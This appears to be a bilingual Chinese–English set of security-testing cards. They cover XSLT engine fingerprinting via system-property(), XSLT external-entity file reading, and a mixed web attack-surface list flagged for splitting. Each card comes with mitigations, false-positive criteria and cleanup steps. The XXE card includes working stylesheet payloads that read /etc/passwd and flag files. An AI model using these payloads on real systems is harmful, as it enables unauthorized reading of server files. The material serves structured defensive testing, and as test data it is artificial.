vulnerability.zh: 处理器名称与版本暴露通常是低风险信息，本身不证明可利用缺陷；但它能帮助识别已知安全开关、扩展命名空间和补丁状态。只有应用允许不可信 XSLT 参与转换时，这组输入才有测试入口。
vulnerability.en: Processor name and version exposure is usually low-risk information and does not itself prove an exploitable flaw, but it helps identify security switches, extension namespaces, and patch status. The inputs have a test surface only when untrusted XSLT participates in transformation.

exploitation.zh: 步骤一用固定文本模板确认服务端确实执行上传样式表；步骤二逐项回放原始 system-property 查询并保存原始转换输出与服务版本清单；步骤三在本地不同处理器运行同一模板对照，排除静态文档、客户端转换或预置字符串造成的假阳性。
exploitation.en: First use a fixed-text template to confirm the server actually executes the submitted stylesheet. Replay each original system-property query and preserve raw transform output and service inventory. Run the same template under alternate local processors to exclude static documentation, client-side transformation, or hard-coded strings as false positives.

mitigation.zh: 不要接受用户提供的可执行样式表；隐藏非必要的详细版本输出并保持处理器更新；将引擎选择固定在服务端配置，关闭不需要的扩展，并把指纹结果仅作为后续受控验证输入。
mitigation.en: Do not accept user-provided executable stylesheets. Suppress unnecessary detailed version output and keep processors updated. Pin engine selection in server configuration, disable unneeded extensions, and use fingerprint results only to guide controlled follow-up testing.

title.zh: 确认服务端 XSLT 转换

description.zh: 用固定文本输出确认样式表由目标服务处理，而不是客户端或测试工具本地转换。
description.en: Use fixed text output to confirm the target service, not the client or test tool, processes the stylesheet.

description.zh: 回放原始 vendor/version 查询并保存未经加工的转换结果与请求关联标识。
description.en: Replay the original vendor and version queries and preserve unmodified transform results with request correlation IDs.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:version')"/></xsl:template></xsl:stylesheet>
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor-url')"/></xsl:template></xsl:stylesheet>

description.zh: 将属性结果与部署资产清单核对，避免把指纹本身升级为 RCE 或文件读取结论。
description.en: Compare properties with deployment inventory and avoid escalating a fingerprint alone into an RCE or file-read conclusion.

review.rationale: system-property 只做 XSLT 引擎指纹，应从 SQL/NoSQL 注入纠正为信息收集，不能与执行型样式表混为一谈。

prerequisites.zh: 攻击者可控或测试 stylesheet 由目标服务端 Transformer 执行，system-property() 输出未被应用替换，处理器实例可追踪。
prerequisites.en: An attacker-controlled or test stylesheet is executed by the target server-side Transformer, system-property() output is not application-substituted, and the processor instance is traceable.

prerequisites.zh: 分别查询 xsl:vendor、xsl:version 和 xsl:vendor-url，并用空输入文档记录转换任务、TransformerFactory 类、输出和依赖版本。
prerequisites.en: xsl:vendor, xsl:version, and xsl:vendor-url are queried separately with an empty input document, recording transform job, TransformerFactory class, output, and dependency version.

analysis.zh: 阳性证据是目标处理器实际执行 system-property() 并返回与运行中 TransformerFactory/依赖相符的 vendor/version 值，三项输出可交叉验证。 假阳性边界：应用 banner/错误页给出版本、stylesheet 中含 vendor 字符串、浏览器端 XSLT、缓存的固定响应、代理插入值或只有一个通用 xsl:version 均不能完整指纹。
analysis.en: Positive evidence requires the target processor to execute system-property() and return vendor and version values matching the running TransformerFactory and dependency, with all outputs cross-confirmed. False-positive boundary: Version text from an application banner or error, vendor strings in the stylesheet, browser-side XSLT, a cached fixed response, proxy-inserted values, or one generic xsl:version alone does not establish a full fingerprint.

opsecTips.zh: XSLT 指纹只调用 system-property，不使用扩展函数、document() 或实体；出现文件/网络访问、敏感配置、异常编译或资源增长时停止。
opsecTips.en: XSLT fingerprinting calls system-property only and never extensions, document(), or entities; stop on file or network access, sensitive configuration, compilation anomalies, or resource growth.

opsecTips.zh: 删除指纹 stylesheet/输出/canary，清理 Transformer/template 缓存和测试日志，记录确认版本后恢复普通转换。
opsecTips.en: Delete fingerprint stylesheets, outputs, and canaries, clear Transformer and template caches plus test logs, record the confirmed version, and restore normal transforms.

name.zh: XSLT 外部实体本地文件读取

description.zh: 验证 XSLT 文档中的外部 DTD 实体是否被解析并读取服务器本地文件，再将内容写入转换结果。
description.en: Tests whether an external DTD entity in an XSLT document is resolved to a server-local file and included in transformation output.

subCategory.zh: XSLT 外部实体文件读取

overview.zh: 原样式表在 DOCTYPE 中声明 SYSTEM file: 实体，并在模板输出中引用。虽然载体是 XSLT，关键解析边界是 XML 外部实体解析，因此应归 XXE，而不是把所有 XSLT 条目都归 RCE。
overview.en: The source declares a SYSTEM file entity in a DOCTYPE and references it in template output. Although the carrier is XSLT, the critical parser boundary is XML external-entity resolution, so it is XXE rather than RCE.

vulnerability.zh: 当处理器允许 DTD 和外部实体，且攻击者能控制样式表文档，解析器会以转换服务账号读取 file: 目标。文件名出现在错误中或渲染失败不等于内容泄露，必须观察唯一文件 Canary 被解析到输出。
vulnerability.en: When the processor allows DTDs and external entities and the attacker controls the stylesheet document, the parser reads file targets as the transform service account. A filename in an error or a failed render is not disclosure; a unique file canary must appear in output.

exploitation.zh: 步骤一准备只含随机 Canary 的隔离本地文件并用无 DTD 样式表记录输出；步骤二将原始外部实体集合指向该文件，捕获解析日志和转换结果；步骤三禁用 DTD/外部实体后重放，排除模板中的静态文本、错误页路径或测试工具本地解析造成的假阳性。
exploitation.en: First prepare an isolated local file containing only a random canary and record output with a stylesheet without DTDs. Point the original external-entity pattern at that file and capture parser logs and transform output. Replay with DTDs and external entities disabled to exclude static template text, error-page paths, or local parsing by the test tool as false positives.

mitigation.zh: 在具体 XML/XSLT 处理器中禁用 DTD、外部通用实体和参数实体；拒绝用户控制样式表并使用受信模板；以低权限、只读文件系统运行转换，限制 file: 与网络解析并添加 Canary 回归。
mitigation.en: Disable DTDs, external general entities, and parameter entities in the selected XML or XSLT processor. Reject user-controlled stylesheets and use trusted templates. Run transforms under least privilege on a read-only filesystem, block file and network resolution, and add canary regressions.

description.zh: 创建无敏感内容的随机文件并确认转换账号可见范围与普通模板输出基线。
description.en: Create a random nonsensitive file and confirm transform-account visibility and normal template output.

title.zh: 解析 XSLT 外部实体

description.zh: 回放原始 DOCTYPE/实体结构并关联解析器访问日志与输出中的唯一 Canary。
description.en: Replay the original DOCTYPE and entity structure and correlate parser access logs with the unique canary in output.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "file:///etc/passwd">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">Fruits &ext_file;</xsl:template></xsl:stylesheet>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "file:///flag">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">Fruits &ext_file;</xsl:template></xsl:stylesheet>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "file:///flag.txt">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">Fruits &ext_file;</xsl:template></xsl:stylesheet>

title.zh: 禁用 DTD 与外部解析

description.zh: 关闭实体解析后重放，确认固定 XSLT 仍执行且 file: 内容不再被读取。
description.en: Replay after disabling entity resolution to confirm fixed XSLT still runs while file content is no longer read.

review.rationale: 该条通过 XSLT 文档中的外部 DTD 实体读取 file:，真实分类是 XXE 文件读取而非 SQL 注入或 XSLT RCE。

prerequisites.zh: 可控 XSLT 文档在服务端 XML/XSLT parser 中允许 DOCTYPE 与外部实体，实体解析器、基础 URI 和文件权限可观察。
prerequisites.en: A controlled XSLT document is parsed server-side with DOCTYPE and external entities enabled, and entity resolver, base URI, and file permissions are observable.

prerequisites.zh: 所有系统路径替换为 Transformer 沙箱内固定 marker 文件，保存 stylesheet 哈希、实体 resolver 回调、文件审计和转换输出。
prerequisites.en: All system paths are replaced by a fixed marker file inside the Transformer sandbox, preserving stylesheet hash, entity-resolver callbacks, file audit, and transform output.

analysis.zh: 阳性证据是目标 XSLT 解析阶段打开 marker 文件、展开 ext_file 并将内容写入转换结果，parser 调用、文件访问和任务相互对应。 假阳性边界：DOCTYPE 字符串存在、路径出现在错误、XSLT 编译失败、实体保持字面量、浏览器端转换、文件不存在或 document() 另一路径成功均不是外部实体读取。
analysis.en: Positive evidence requires the target XSLT parse phase to open the marker file, expand ext_file, and place its content into transform output, correlating parser call, file access, and job. False-positive boundary: A DOCTYPE string, paths in errors, XSLT compilation failure, a literal entity, browser-side transformation, a missing file, or success through separate document() behavior does not prove external-entity reading.

opsecTips.zh: XSLT XXE 只读取短 marker，禁止系统/网络实体和递归 DTD；出现真实文件、外连、实体扩张、敏感输出或 worker 异常时停止。
opsecTips.en: XSLT XXE reads a short marker only and forbids system or network entities and recursive DTDs; stop on real files, egress, entity expansion, sensitive output, or worker anomalies.

opsecTips.zh: 删除 stylesheet/marker/转换产物，清理 entity/Transformer 缓存和错误日志，恢复外部实体禁用并重启测试 worker。
opsecTips.en: Delete stylesheets, markers, and transform artifacts, clear entity and Transformer caches plus error logs, restore disabled external entities, and restart test workers.

name.zh: 混合 Web 攻击面集合（待拆分）

description.zh: 包含开放重定向路径混淆、缓存后缀、Spring Actuator、版本库元数据及调试端点的混合集，不能作为单一漏洞卡执行。
description.en: A mixed collection of open-redirect path confusion, cache suffixes, Spring Actuator routes, repository metadata, and debug endpoints that cannot be executed as one vulnerability card.

subCategory.zh: 混合 Web 攻击面拆分

overview.zh: 原条目把多种无共同 Sink 的路径放在一个 52 条集合中：前缀与控制字符可测试重定向解析，伪静态后缀可测试缓存差异，/actuator 属于 Spring 管理端点，/.hg 和 debug/health 路径则属于元数据或运维暴露。单教程无法准确解释。
overview.en: The source combines paths without one common sink: prefix and control-character forms can test redirect parsing, static-looking suffixes can test cache behavior, actuator paths are Spring management endpoints, and repository or debug paths concern metadata and operational exposure. One tutorial cannot describe them accurately.

vulnerability.zh: 这些候选分别依赖 URL 解析器、共享缓存、Spring 配置、静态文件发布和运维路由，不同响应证据不可互换。整组发送后得到 200、403 或统一错误页既不能定位失败控制，也可能对敏感 heapdump 等端点产生不必要负载。
vulnerability.en: The candidates depend on URL parsers, shared caches, Spring configuration, static-file publication, and operational routing, and their evidence is not interchangeable. Sending the whole set and receiving 200, 403, or a generic error neither identifies a failed control nor avoids unnecessary load on sensitive endpoints such as heapdump.

exploitation.zh: 步骤一按重定向、缓存、Actuator、版本库/调试端点四组拆分原始命令；步骤二为每组建立专用基线、低影响请求与日志证据；步骤三只在对应隔离环境验证最终主机、跨身份缓存内容、管理数据或元数据泄露，排除 SPA fallback、统一 200、认证拦截和来源名称匹配造成的假阳性。
exploitation.en: First split the source command into redirect, cache, Actuator, and repository or debug groups. Build dedicated baselines, low-impact requests, and log evidence for each group. Validate final hosts, cross-identity cache content, management data, or metadata only in the matching isolated environment, excluding SPA fallback, uniform 200 responses, authentication interception, and source-name matching as false positives.

mitigation.zh: 将集合拆成独立卡并为每卡定义唯一 Sink 与成功标准；默认关闭或认证管理和调试端点，阻止版本库文件发布；统一 URL/缓存路由规则，并对高成本管理接口设置网络隔离、速率和响应大小限制。
mitigation.en: Split the collection into independent cards with one sink and success criterion each. Disable or authenticate management and debug endpoints and block repository files from publication. Align URL and cache routing and isolate, rate-limit, and size-limit expensive management endpoints.

title.zh: 按四类 Sink 拆分命令
title.en: Split commands into four sink groups

description.zh: 把原始内容分为重定向解析、缓存后缀、Spring 管理端点和版本库/调试暴露四组。
description.en: Divide the source into redirect parsing, cache suffixes, Spring management endpoints, and repository or debug exposure.

title.zh: 保留原集合作为路由清单
title.en: Preserve the source as a routing inventory

description.zh: 保存完整原命令用于逐行归属审计，但禁止作为一个批量 Payload 对生产目标直接执行。
description.en: Preserve the complete source command for line-by-line routing review but do not execute it against production as one bulk payload.
